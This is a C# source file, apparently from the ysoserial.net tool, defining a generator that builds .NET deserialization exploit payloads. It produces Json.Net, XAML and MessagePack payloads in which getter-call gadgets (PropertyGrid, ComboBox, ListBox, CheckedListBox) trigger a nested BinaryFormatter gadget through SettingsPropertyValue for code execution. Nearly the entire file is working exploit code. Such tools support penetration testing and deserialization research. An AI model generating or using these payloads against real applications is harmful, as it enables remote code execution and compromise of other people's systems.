using NDesk.Options;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using System.Security.Principal;
using System.Windows.Markup;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    public class GetterSettingsPropertyValueGenerator : GenericGenerator
    {
        // SettingsPropertyValue + Getter call gadget
        // SettingsPropertyValue.get_PropertyValue leads to the BinaryFormatter.Deserialize

        // We can deserialize the SettingsPropertyValue with proper member values (like Deserialzed=False and SerializedValue=BinaryFormatter_gadget)
        // and then call the get_PropertyValue with one of the getter-call gadgets:
        // PropertyGrid
        // ComboBox
        // ListBox
        // CheckedListBox

        // It should be possible to use it with the serializers that are able to call the one-arg constructor
        // MessagePack gadget works from version 2.3.75. There is a huge chance that it will also work for older versions after some tweaking.

        private int variant_number = 1; // Default

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "Json.Net", "Xaml", "MessagePackTypeless", "MessagePackTypelessLz4" };
        }

        public override string Name()
        {
            return "GetterSettingsPropertyValue";
        }

        public override string Finders()
        {
            return "Piotr Bazydlo";
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Variant number. Variant defines a different getter-call gadget. Choices: \r\n1 (default) - PropertyGrid getter-call gadget, " +
                "\r\n2 - ComboBox getter-call gadget (may execute code twice)" +
                "\r\n3 - ListBox getter-call gadget" +
                "\r\n4 - CheckedListBox getter-call gadget", v => int.TryParse(v, out variant_number) },
            };

            return options;
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.GetterChainAndDerived };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                IGenerator generator = new TypeConfuseDelegateGenerator();
                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
            
            string payload = "";

            if (formatter.ToLower().Equals("json.net"))
            {
                string spvPayload = @"{
            '$type':'System.Configuration.SettingsPropertyValue, System',
            'Name':'test',
            'IsDirty':false,
            'SerializedValue':
                {
                    '$type':'System.Byte[], mscorlib',
                    '$value':'" + b64encoded + @"'
                },
            'Deserialized':false
        }";
                if (variant_number == 2)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.ComboBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + spvPayload + @"
    ], 
    'DisplayMember':'PropertyValue',
    'Text':'watever'
}";
                }
                else if (variant_number == 3)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.ListBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + spvPayload + @"
    ], 
    'DisplayMember':'PropertyValue',
    'Text':'watever'
}";
                }
                else if (variant_number == 4)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.CheckedListBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + spvPayload + @"
    ], 
    'DisplayMember':'PropertyValue',
    'Text':'watever'
}";
                }
                else
                {
                    payload = @"{
    '$type':'System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'SelectedObjects':[
        " + spvPayload + @"
    ]
}";
                }

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = JsonHelper.Minify(payload, new string[] { "mscorlib" }, null);
                    }
                    else
                    {
                        payload = JsonHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("xaml"))
            {

                String bfBytes = XamlWriter.Save(binaryFormatterPayload);
                bfBytes = bfBytes.Replace("<Byte[] xmlns=\"clr-namespace:System;assembly=mscorlib\">", "<assembly:Array Type=\"s:Byte\">");
                bfBytes = bfBytes.Replace("</Byte[]>", "</assembly:Array>");
                bfBytes = bfBytes.Replace("<Byte>", "<s:Byte>");
                bfBytes = bfBytes.Replace("</Byte>", "</s:Byte>");

                if (variant_number == 2)
                {
                    payload = "<ComboBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><ComboBox.Items><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></ComboBox.Items><ComboBox.DisplayMember>PropertyValue</ComboBox.DisplayMember><ComboBox.Text>watever</ComboBox.Text></ComboBox>";
                }
                else if (variant_number == 3)
                {
                    payload = "<ListBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><ListBox.Items><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></ListBox.Items><ListBox.DisplayMember>PropertyValue</ListBox.DisplayMember><ListBox.Text>watever</ListBox.Text></ListBox>";
                }
                else if (variant_number == 4)
                {
                    payload = "<CheckedListBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><CheckedListBox.Items><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></CheckedListBox.Items><CheckedListBox.DisplayMember>PropertyValue</CheckedListBox.DisplayMember><CheckedListBox.Text>watever</CheckedListBox.Text></CheckedListBox>";
                }
                else
                {
                    payload = "<PropertyGrid UseCompatibleTextRendering=\"True\" Location=\"0, 0\" Name=\"\" TabIndex=\"0\" xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><PropertyGrid.SelectedObject><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></PropertyGrid.SelectedObject></PropertyGrid>";
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.Xaml_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }

                return payload;
            }
            else if (formatter.ToLowerInvariant().Equals("messagepacktypeless") || formatter.ToLowerInvariant().Equals("messagepacktypelesslz4"))
            {
                Console.WriteLine("\r\nThis version of gadget works for MessagePack >= 2.3.75\r\n");
                if (variant_number != 1)
                {
                    Console.WriteLine("GetterSettingsPropertyValue is implemented only for variant 1 (PropertyGrid getter chain). Switching to variant 1.\r\n");
                    variant_number = 1;
                }
                if (formatter.ToLowerInvariant().Equals("messagepacktypeless"))
                {
                    var serializedData = MessagePackGetterSettingsPropertyValueHelper.CreateGetterSettingsPropertyValueGadget(binaryFormatterPayload, false);

                    if (inputArgs.Test)
                    {
                        try
                        {
                            MessagePackGetterSettingsPropertyValueHelper.Test(serializedData, false);
                        }
                        catch { }
                    }
                    return serializedData;
                }
                else // LZ4
                {
                    var serializedData = MessagePackGetterSettingsPropertyValueHelper.CreateGetterSettingsPropertyValueGadget(binaryFormatterPayload, true);

                    if (inputArgs.Test)
                    {
                        try
                        {
                            MessagePackGetterSettingsPropertyValueHelper.Test(serializedData, true);
                        }
                        catch { }
                    }
                    return serializedData;
                }
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }

}
